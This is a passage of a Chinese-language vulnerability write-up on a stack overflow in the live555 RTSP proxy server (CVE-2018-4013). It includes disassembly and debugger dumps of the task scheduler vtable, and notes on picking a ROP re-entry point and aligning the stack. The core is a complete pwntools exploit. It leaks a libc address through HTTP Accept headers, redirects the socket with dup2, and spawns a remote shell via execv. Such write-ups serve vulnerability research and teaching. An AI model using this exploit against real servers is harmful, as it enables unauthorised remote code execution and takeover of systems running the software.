+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA08</span>                                         <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::~</span><span class="n">BasicTaskScheduler</span><span class="p">()</span><span class="o">+</span><span class="mi">4</span><span class="err">↑</span><span class="n">o</span> <span class="p">...</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA08</span>                                         <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::~</span><span class="n">BasicTaskScheduler</span><span class="p">()</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA10</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN18BasicTaskSchedulerD0Ev</span> <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::~</span><span class="n">BasicTaskScheduler</span><span class="p">()</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA18</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler019scheduleDelayedTaskElPFvPvES0_</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">scheduleDelayedTask</span><span class="p">(</span><span class="kt">long</span><span class="p">,</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">),</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA20</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler021unscheduleDelayedTaskERPv</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">unscheduleDelayedTask</span><span class="p">(</span><span class="kt">void</span> <span class="o">*&amp;</span><span class="p">)</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA28</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN13TaskScheduler21rescheduleDelayedTaskERPvlPFvS0_ES0_</span> <span class="p">;</span> <span class="n">TaskScheduler</span><span class="o">::</span><span class="n">rescheduleDelayedTask</span><span class="p">(</span><span class="kt">void</span> <span class="o">*&amp;</span><span class="p">,</span><span class="kt">long</span><span class="p">,</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">),</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA30</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN18BasicTaskScheduler21setBackgroundHandlingEiiPFvPviES0_</span> <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">setBackgroundHandling</span><span class="p">(</span><span class="kt">int</span><span class="p">,</span><span class="kt">int</span><span class="p">,</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span><span class="kt">int</span><span class="p">),</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA38</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN18BasicTaskScheduler18moveSocketHandlingEii</span> <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">moveSocketHandling</span><span class="p">(</span><span class="kt">int</span><span class="p">,</span><span class="kt">int</span><span class="p">)</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA40</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler011doEventLoopEPVc</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">doEventLoop</span><span class="p">(</span><span class="kt">char</span> <span class="k">volatile</span><span class="o">*</span><span class="p">)</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA48</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler018createEventTriggerEPFvPvE</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">createEventTrigger</span><span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">))</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA50</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler018deleteEventTriggerEj</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">deleteEventTrigger</span><span class="p">(</span><span class="n">uint</span><span class="p">)</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA58</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler012triggerEventEjPv</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">triggerEvent</span><span class="p">(</span><span class="n">uint</span><span class="p">,</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA60</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN16UsageEnvironment13internalErrorEv</span> <span class="p">;</span> <span class="n">UsageEnvironment</span><span class="o">::</span><span class="n">internalError</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA68</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN18BasicTaskScheduler10SingleStepEj</span> <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">SingleStep</span><span class="p">(</span><span class="n">uint</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>通过调试进一步验证了上述猜想，TaskScheduler对象的地址为0x158fdeb0，该地址位于堆，说明对象是动态分配在堆上面的。</p>
+
+<p>对象的第一个8字节是指向虚表中的函数指针表的指针，值为0x46aa08，与反汇编结果一致。</p>
+
+<p>函数指针表中偏移0x38的位置就是doEventLoop函数的地址，与反汇编结果一致。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──────────────────────────────[ BACKTRACE <span class="o">]</span>────────────────────────────────────
+ ► 0         0x441bc0 BasicTaskScheduler0::doEventLoop<span class="o">(</span>char volatile<span class="k">*</span><span class="o">)</span>
+   1         0x4052f2 main+1218
+   2              0x0 None
+───────────────────────────────────────────────────────────────────────────────
+<span class="c">#0  BasicTaskScheduler0::doEventLoop (this=0x158fdeb0, watchVariable=0x0) at BasicTaskScheduler0.cpp:76</span>
+<span class="c">#1  0x00000000004052f2 in main (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at live555ProxyServer.cpp:263</span>
+<span class="c">#2  0x0000000000000000 in ?? ()</span>
+pwndbg&gt; x/16xw this                 // 观察TaskScheduler对象, 0x46aa08指向虚表
+0x158fdeb0:     0x0046aa08      0x00000000      0x00464ba8      0x00000000
+0x158fdec0:     0x15904050      0x00000000      0x15904000      0x00000000
+0x158fded0:     0x7fffffca      0x00000000      0x0001789a      0x00000000
+0x158fdee0:     0x00000001      0x00000000      0x67fe29e2      0x00000000
+pwndbg&gt; x/32xg 0x0046aa08           // 观察虚表, 里面都是函数指针
+0x46aa08 &lt;_ZTV18BasicTaskScheduler+16&gt;: 0x000000000043fec0      0x000000000043fee0
+0x46aa18 &lt;_ZTV18BasicTaskScheduler+32&gt;: 0x0000000000441dc0      0x0000000000441e60
+0x46aa28 &lt;_ZTV18BasicTaskScheduler+48&gt;: 0x0000000000442300      0x000000000043ff10
+0x46aa38 &lt;_ZTV18BasicTaskScheduler+64&gt;: 0x0000000000440050      0x0000000000441bc0
+0x46aa48 &lt;_ZTV18BasicTaskScheduler+80&gt;: 0x0000000000441c00      0x0000000000441ea0
+0x46aa58 &lt;_ZTV18BasicTaskScheduler+96&gt;: 0x0000000000441c70      0x0000000000404e22
+0x46aa68 &lt;_ZTV18BasicTaskScheduler+112&gt;:        0x00000000004402d0      0x00007f89e8a85008
+</code></pre></div></div>
+
+<h1 id="漏洞利用">漏洞利用</h1>
+
+<p>首先开启服务端程序，live555会在本机8000端口监听：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./live555ProxyServer rtsp://127.0.0.1
+LIVE555 Proxy Server
+        <span class="o">(</span>LIVE555 Streaming Media library version 2018.08.28<span class="p">;</span> licensed under the GNU LGPL<span class="o">)</span>
+
+Created new TCP socket 4 <span class="k">for </span>connection
+RTSP stream, proxying the stream <span class="s2">"rtsp://127.0.0.1"</span>
+        Play this stream using the URL: rtsp://192.168.141.128:8554/proxyStream
+
+<span class="o">(</span>We use port 8000 <span class="k">for </span>optional RTSP-over-HTTP tunneling.<span class="o">)</span>
+Created new TCP socket 4 <span class="k">for </span>connection
+Created new TCP socket 4 <span class="k">for </span>connection
+</code></pre></div></div>
+
+<p>漏洞利用代码：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python 
+</span>
+<span class="c1"># ./exp.py 127.0.0.1 8000
+</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="sh">'</span><span class="s">linux</span><span class="sh">'</span>
+
+<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x405301</span>
+<span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="mh">0x406277</span>
+<span class="n">pop_rdx_rbx_ret</span> <span class="o">=</span> <span class="mh">0x424b50</span>
+<span class="n">pop_rcx_ret</span> <span class="o">=</span> <span class="mh">0x415bb5</span>
+<span class="n">re_enter</span> <span class="o">=</span> <span class="mh">0x4052DF</span>
+<span class="n">send_plt</span> <span class="o">=</span> <span class="mh">0x403560</span>   <span class="c1"># ssize_t send(int sockfd, const void *buf, size_t len, int flags);
+</span><span class="n">strncmp_got</span> <span class="o">=</span> <span class="mh">0x46B080</span>
+<span class="n">dup2_off</span> <span class="o">=</span> <span class="mh">0x10EAE0</span>
+<span class="n">execv_off</span> <span class="o">=</span> <span class="mh">0xE32D0</span>
+<span class="n">sh_off</span> <span class="o">=</span> <span class="mh">0x1B45BD</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="mh">0x184230</span>
+
+<span class="k">def</span> <span class="nf">genHeader</span><span class="p">(</span><span class="n">raw</span><span class="p">):</span>
+    <span class="n">header</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
+GET / HTTP/1.1</span><span class="se">\r\n</span><span class="s">
+Host: 127.0.0.1:8000</span><span class="se">\r\n</span><span class="s">
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0</span><span class="se">\r\n</span><span class="s">
+Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><span class="se">\r\n</span><span class="s">
+Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">
+Connection: keep-alive</span><span class="se">\r\n</span><span class="s">
+Upgrade-Insecure-Requests: 1</span><span class="se">\r\n</span><span class="s">
+</span><span class="sh">'''</span>
+    <span class="n">header</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">Accept:</span><span class="sh">"</span>
+    <span class="n">header</span> <span class="o">=</span> <span class="n">header</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
+    <span class="n">chunks</span> <span class="o">=</span> <span class="p">[</span><span class="n">raw</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">50</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">raw</span><span class="p">),</span> <span class="mi">50</span><span class="p">)]</span>
+    <span class="k">if</span> <span class="n">chunks</span><span class="p">:</span>
+        <span class="n">header</span> <span class="o">+=</span> <span class="sh">"</span><span class="se">\r\n</span><span class="s">Accept:</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">().</span><span class="nf">join</span><span class="p">(</span><span class="n">chunks</span><span class="p">)</span>  <span class="c1"># Join chunks with delimiter
+</span>    
+    <span class="c1"># End the header
+</span>    <span class="n">header</span> <span class="o">+=</span> <span class="sh">"</span><span class="se">\r\n\r\n</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">header</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">:</span><span class="n">remote</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
+    <span class="n">raw</span> <span class="o">=</span> <span class="nf">genHeader</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">raw</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">usage: python cve-2018-4013.py IP PORT</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">exit</span><span class="p">()</span>
+
+<span class="n">rp</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>          <span class="c1"># 127.0.0.1:8000
+</span>
+<span class="c1"># 泄露strncmp地址
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x1c8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">strncmp_got</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_rbx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rcx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">send_plt</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">re_enter</span><span class="p">)</span>
+
+<span class="nf">exploit</span><span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">strncmp_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">rp</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">strncmp: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">strncmp_addr</span><span class="p">))</span>
+
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">strncmp_addr</span> <span class="o">-</span> <span class="n">offset</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">libc base: </span><span class="sh">'</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+<span class="n">dup2_addr</span> <span class="o">=</span> <span class="n">dup2_off</span> <span class="o">+</span> <span class="n">libc_base</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">dup2: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">))</span>
+
+<span class="n">execv_addr</span> <span class="o">=</span> <span class="n">execv_off</span> <span class="o">+</span> <span class="n">libc_base</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">execv: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">execv_addr</span><span class="p">))</span>
+
+<span class="n">sh_addr</span> <span class="o">=</span> <span class="n">sh_off</span> <span class="o">+</span> <span class="n">libc_base</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">sh string: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">))</span>
+
+<span class="c1"># 输入输出重定向
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x1c8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">re_enter</span><span class="p">)</span>
+
+<span class="nf">exploit</span><span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># 起一个shell
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x1c8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_rbx_ret</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
+            <span class="nf">p64</span><span class="p">(</span><span class="n">execv_addr</span><span class="p">)</span>
+
+<span class="nf">exploit</span><span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">rp</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<h1 id="重入位置怎么找">重入位置怎么找</h1>
+
+<h2 id="环境准备的问题">环境准备的问题</h2>
+
+<p>如果我们仅仅跳到doEventLoop函数的地址，那么肯定会崩溃，因为不满足两个条件：</p>
+
+<ul>
+  <li>rdi没有指向TaskScheduler对象的地址，实测发现rdi=1</li>
+  <li>rsi不等于0，也就是watchVariable参数不为0，那么while(1)循环就继续不下去</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void BasicTaskScheduler0::doEventLoop<span class="o">(</span>char volatile<span class="k">*</span> watchVariable<span class="o">)</span> <span class="o">{</span>
+  <span class="k">while</span> <span class="o">(</span>1<span class="o">)</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span>watchVariable <span class="o">!=</span> NULL <span class="o">&amp;&amp;</span> <span class="k">*</span>watchVariable <span class="o">!=</span> 0<span class="o">)</span> <span class="nb">break</span><span class="p">;</span>
+    SingleStep<span class="o">()</span><span class="p">;</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>所以我们选择跳转到main函数调用doEventLoop的位置：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+  
+  <span class="n">TaskScheduler</span><span class="o">*</span> <span class="n">scheduler</span> <span class="o">=</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">createNew</span><span class="p">();</span>
+  <span class="n">UsageEnvironment</span><span class="o">*</span> <span class="n">env</span> <span class="o">=</span> <span class="n">BasicUsageEnvironment</span><span class="o">::</span><span class="n">createNew</span><span class="p">(</span><span class="o">*</span><span class="n">scheduler</span><span class="p">);</span>
+  <span class="p">......</span>
+  <span class="n">env</span><span class="o">-&gt;</span><span class="n">taskScheduler</span><span class="p">().</span><span class="n">doEventLoop</span><span class="p">();</span> <span class="c1">//选择这里作为重入点</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>因为这一块完成了进入doEventLoop之前的环境初始化，满足了rdi和rsi寄存器的条件。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:00000000004052DF loc_4052DF:                             <span class="p">;</span> CODE XREF: main+5D5↓j
+.text:00000000004052DF    mov   rax, cs:env    <span class="p">;</span> 解引用env对象
+.text:00000000004052E6    xor   esi, esi       <span class="p">;</span> <span class="nb">env</span>+0x18的位置保存TaskScheduler对象指针
+.text:00000000004052E8    mov   rdi, <span class="o">[</span>rax+18h] <span class="p">;</span> fScheduler对象地址作为第一个参数, this
+.text:00000000004052EC    mov   rax, <span class="o">[</span>rdi]     <span class="p">;</span> 对象的第一个8字节保存的函数虚表地址
+.text:00000000004052EF    call  qword ptr <span class="o">[</span>rax+38h] <span class="p">;</span> 虚表中index为7的槽位是doEventLoop函数指针
+</code></pre></div></div>
+
+<h2 id="寄存器对齐问题">寄存器对齐问题</h2>
+
+<p>有些函数在中间一些步骤要确保rsp寄存器16字节对齐，否则会报段错误。</p>
+
+<p>这个要根据具体的情况调试确定在重入之前rsp是8字节对齐还是16字节对齐。</p>
+
+<p>在<a href="https://www.notion.so/torque-2-5-13-1cf3f4b7819d8064a26ee66740a68cfa?pvs=21">torque栈溢出漏洞分析</a>过程中发现了这个问题，因为rsp没有16字节对齐而导致snprintf函数段错误</p>
+
+<p>总结一些重入点的选择方法：</p>
+
+<ul>
+  <li>要选择函数实际调用的位置作为重入点，而非函数定义的位置；</li>
+  <li>在调用路径上选择重入点，尽量选择不带参数的函数，因为一旦带了参数就涉及到更加复杂的参数问题。不带参数的函数说明用的都是全局变量，栈溢出不会破坏全局变量；</li>
+</ul>
+
+    </div>
+</article>
+
+                
+                <footer class="footer">
+        <section class="footer__about">
+                <p class="footer__about__copyright">© qts588 2025</p>
+                
+                <span class="divider">·</span>
+                
+                <span class="footer__about__theme"><p>theme</p><a id="simplex-logo" href="https://github.com/andreondra/jekyll-theme-simplex" target="_blank"><img alt="Simplex theme logo" src="http://localhost:4000/assets/img/icons/simplex_logo.svg"/></a><p>by <a href="https://ondrej.golasowski.com/">golas</a></p></span>
+        </section>
+</footer>
+            </main>
+            <script src="http://localhost:4000/assets/js/jquery.slim.min.js"></script>
+<script src="http://localhost:4000/assets/js/lity.min.js"></script>
+<script src="http://localhost:4000/assets/js/tools.js"></script>
+<script src="http://localhost:4000/assets/js/pic.js"></script>
+<script src="http://localhost:4000/assets/js/toc-highlight.js"></script>
+        </div>
+    
+</body>
+</html>
